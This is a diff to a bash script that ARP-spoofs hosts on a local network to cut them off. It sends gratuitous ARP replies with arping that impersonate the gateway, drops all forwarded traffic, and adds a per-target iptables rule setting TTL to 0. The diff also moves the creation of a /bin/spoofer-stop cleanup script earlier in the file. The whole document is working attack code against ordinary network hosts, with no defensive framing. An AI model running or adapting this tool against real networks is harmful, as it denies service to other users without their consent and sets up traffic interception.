@@ -4,11 +4,24 @@
 iptables -P FORWARD DROP
 iptables -I FORWARD -j DROP
 
-# Block hops by setting TTL to 0
-iptables -t mangle -I PREROUTING -i "$INTERFACE" -j TTL --ttl-set 2>/dev/null
-
 # Enable ip forwarding
 echo 1 > /proc/sys/net/ipv4/ip_forward
+
+# Create cleanup script
+cat > /bin/spoofer-stop << EOF
+#!/bin/bash
+
+# Reset forwarding policy
+iptables -P FORWARD ACCEPT
+iptables -F FORWARD
+iptables -t mangle -F PREROUTING
+
+# Kill arping processes
+pkill -f arping
+
+echo "Spoofer cleanup complete"
+EOF
+chmod 755 /bin/spoofer-stop
 
 # Function to auto-detect interface
 auto_detect_interface() {
@@ -167,24 +180,6 @@ while IFS= read -r target; do
 done <<< "$PROCESSED_TARGETS"
 echo
 
-# Create cleanup script
-cat > /bin/spoofer-stop << EOF
-#!/bin/bash
-
-# Reset forwarding policy
-iptables -P FORWARD ACCEPT
-iptables -F FORWARD
-
-# Kill arping processes
-pkill -f arping
-
-# Remove hop blocking
-iptables -t mangle -D PREROUTING -i "$INTERFACE" -j TTL --ttl-set 0 2>/dev/null
-
-echo "Spoofer cleanup complete"
-EOF
-chmod 755 /bin/spoofer-stop
-
     # Store PIDs for cleanup
     pids=()
 
@@ -193,9 +188,10 @@ chmod 755 /bin/spoofer-stop
         if [[ -n "$target" ]]; then
             echo " "
             echo "Blocking the target IP: $target"
+            iptables -t mangle -I PREROUTING -i "$INTERFACE" -s "$target" -j TTL --ttl-set 0
           ( arping -b -A -i "$INTERFACE" -S "$GATEWAY" "$target" >/dev/null 2>&1 ) &
             pid1=$!
-            pids+=($pid1 )
+            pids+=($pid1)
         fi
     done <<< "$PROCESSED_TARGETS"
 
